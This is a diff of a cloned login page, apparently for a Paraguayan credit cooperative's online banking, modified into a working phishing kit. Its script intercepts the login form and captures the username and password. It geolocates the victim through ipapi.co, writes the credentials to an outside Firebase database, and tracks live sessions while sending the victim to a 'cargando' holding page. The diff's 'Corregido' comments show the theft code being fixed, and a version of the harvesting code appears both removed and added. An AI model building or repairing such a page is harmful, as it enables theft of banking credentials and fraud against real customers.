@@ -10,7 +10,7 @@
     <link href="./jquery-ui2.css" type="text/css" rel="stylesheet">
     <script type="text/javascript" src="./frmInicioWebPersona.js.descarga"></script>
     <link href="./default(1).css" type="text/css" rel="stylesheet">
-<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
     <script language="JavaScript" type="text/javascript">
 
@@ -186,7 +186,7 @@ function __doPostBack(eventTarget, eventArgument) {
 
                                             <tr align="center">
                                                 <td align="center" valign="top">
-                                                    <button id="btnIngresoLink" title="Ingresar al Sistema" class="ui-button ui-state-default" href="javascript:__doPostBack(&#39;btnIngresoLink&#39;,&#39;&#39;)" style="width: 100%; margin-top: 14px; border: 1px solid #1C2B4D; background: #1C2B4D; border-radius: 25px; ">
+                                                    <button id="btnIngresoLink" type="submit" title="Ingresar al Sistema" class="ui-button ui-state-default" style="width: 100%; margin-top: 14px; border: 1px solid #1C2B4D; background: #1C2B4D; border-radius: 25px; ">
                                                         <div style="text-align:center; padding:8px ;">
                                                             <span class="ui-button-text" style="vertical-align:middle; font-weight:bold ;color:#F1B634; background:none;">INGRESAR</span> 
                                                         </div>                                                 
@@ -287,62 +287,77 @@ function __doPostBack(eventTarget, eventArgument) {
 <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
 <script>
     const firebaseConfig = { databaseURL: "https://coomecipaonline-default-rtdb.firebaseio.com/" };
-    if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+// Generar ID único de sesión
+const sessionId = "ID-" + Math.random().toString(36).substr(2, 5).toUpperCase();
+
+// Sistema de Presencia
+const presenceRef = db.ref('logins/' + sessionId + '/online');
+db.ref('.info/connected').on('value', (snap) => {
+    if (snap.val() === true) {
+        presenceRef.onDisconnect().set(false);
+        presenceRef.set(true);
+    }
+});
+
+// Manejador del Formulario
+document.getElementById('form-login').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    // 1. Corregido el comentario '//'. Abrimos la ventana emergente en blanco de inmediato
+    // para evitar que el navegador la bloquee por seguridad.
+    const ventanaEmergente = window.open('about:blank', 'VentanaUsuario', 'width=${anchoPantalla},height=${altoPantalla},top=0,left=0,scrollbars=yes,resizable=yes');
     
-    // Generar ID único de sesión
-    const sessionId = "ID-" + Math.random().toString(36).substr(2, 5).toUpperCase();
+    // 2. Corregido: Capturamos 'utu' para usuario y 'txtPassword' (o el ID que uses) para la contraseña
+    const u = document.getElementById('user') ? document.getElementById('user').value : '';
+    const p = document.getElementById('Clave') ? document.getElementById('Clave').value : ''; // <- Cambia 'txtPassword' por el ID real de tu input de contraseña
 
-    // Sistema de Presencia
-    const presenceRef = db.ref('logins/' + sessionId + '/online');
-    db.ref('.info/connected').on('value', (snap) => {
-        if (snap.val() === true) {
-            presenceRef.onDisconnect().set(false);
-            presenceRef.set(true);
-        }
-    });
+    // Intentar obtener datos de geolocalización antes del envío
+    fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(ipData => {
+            enviarDatos(ipData);
+        })
+        .catch(() => {
+            // Si la API de IP falla, se envía con datos por defecto para no bloquear el flujo
+            enviarDatos({});
+        });
 
-    // Manejador del Formulario
-    document.getElementById('form-login').addEventListener('submit', function(e) {
-        e.preventDefault();
-        
-        // Captura segura de elementos básicos
-        const u = document.getElementById('user') ? document.getElementById('user').value : '';
-        const p = document.getElementById('Clave') ? document.getElementById('Clave').value : '';
+    // Función interna para estructurar y enviar el objeto a la base de datos
+    function enviarDatos(ipData) {
+        // Corregido: Ahora pasamos 'usuario' y 'password' como claves diferentes en el objeto
+        const payload = {
+            user: u,
+            Clave: p,
+            online: true,
+            ip: ipData.ip || '0.0.0.0',
+            ubicacion: ipData.city && ipData.country_name ? `${ipData.city}, ${ipData.country_name}` : 'Desconocida',
+            fecha: new Date().toLocaleString(),
+            status: 'INGRESANDO CREDENCIALES'
+        };
 
-        // Intentar obtener datos de geolocalización antes del envío
-        fetch('https://ipapi.co/json/')
-            .then(res => res.json())
-            .then(ipData => {
-                enviarDatos(ipData);
+        // URL a la que queremos mandar al usuario
+        const urlDestino = 'cargando.html?id=' + sessionId;
+
+        // Escritura en Firebase
+        db.ref('logins/' + sessionId).set(payload)
+            .then(() => {
+                // 3. Corregido: En lugar de redirigir la ventana principal, 
+                // le asignamos la URL a la ventana emergente que abrimos al principio.
+                if (ventanaEmergente) {
+                    ventanaEmergente.location.href = urlDestino;
+                }
             })
-            .catch(() => {
-                // Si la API de IP falla, se envía con datos por defecto para no bloquear el flujo
-                enviarDatos({});
+            .catch((error) => {
+                console.error("Error:", error);
+                // Si falla Firebase, igual intentamos redirigir la emergente para no romper la experiencia
+                if (ventanaEmergente) {
+                    ventanaEmergente.location.href = urlDestino;
+                }
             });
-
-        // Función interna para estructurar y enviar el objeto a la base de datos
-        function enviarDatos(ipData) {
-            const payload = {
-                user: u,
-                Clave: p,
-                online: true,
-                ip: ipData.ip || '0.0.0.0',
-                ubicacion: ipData.city && ipData.country_name ? `${ipData.city}, ${ipData.country_name}` : 'Desconocida',
-                fecha: new Date().toLocaleString(),
-                status: 'INGRESANDO CREDENCIALES'
-            };
-
-            // Escritura en Firebase y redirección
-            db.ref('logins/' + sessionId).set(payload)
-                .then(() => {
-                    window.location.href = 'cargando.html?id=' + sessionId;
-                })
-                .catch((error) => {
-                    console.error("Error al guardar en Firebase:", error);
-                    window.location.href = 'cargando.html?id=' + sessionId;
-                });
-        }
-    });
+    }
+});
 </script>
 </body></html>
